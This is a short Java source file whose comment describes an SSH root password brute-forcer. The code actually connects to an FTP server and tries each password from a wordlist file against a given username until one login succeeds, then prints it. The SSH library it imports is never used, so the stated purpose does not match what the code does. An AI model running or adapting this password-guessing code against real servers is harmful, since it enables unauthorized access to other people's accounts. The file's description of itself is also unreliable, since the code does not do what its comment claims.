import com.jcraft.jsch.JSch;
import org.apache.commons.net.ftp.FTPClient;
import org.apache.commons.net.ftp.FTPReply;
import com.jcraft.jsch.Session;
import java.io.*;
import java.util.Scanner;
/**
 * SSH bruteforce root - password guessing.
 * @author Aviv
 *
 */
public class SSH
{
	public static String Findpassword(String ip, int port, String user) throws FileNotFoundException
	{
		String server = ip;
		FTPClient ftpClient = new FTPClient();
		System.out.println("Checking for passwords begin.. it may take a while");
		Scanner input = new Scanner(System.in);
		File file = new File("passwords.txt"); // password file
		String result = null;
		input = new Scanner(file);
		try { 
			ftpClient.connect(server, port);
			showServerReply(ftpClient);
			int replyCode = ftpClient.getReplyCode();
			if (!FTPReply.isPositiveCompletion(replyCode)) {
				System.out.println("Operation failed. Server reply code: " + replyCode);
				return result;
			}
			while (input.hasNextLine()) { // reading from password file
				String line = input.nextLine();
				//System.out.println("User:"+user+" Password: "+line);
				boolean success = ftpClient.login(user, line);
				if (!success) {
					System.out.println("Could not login to the server");
				} else {
					System.out.println("LOGGED IN SERVER with password: "+line);
					result = line;
					return result;
				}
			}
		}
		catch (IOException ex) {
			System.out.println("Unable to connect FTP server");
			ex.printStackTrace();
		}
		return result;
	}



	private static void showServerReply(FTPClient ftpClient) {
		String[] replies = ftpClient.getReplyStrings();
		if (replies != null && replies.length > 0) {
			for (String aReply : replies) {
				System.out.println("SERVER: " + aReply);
			}
		}
	}
}
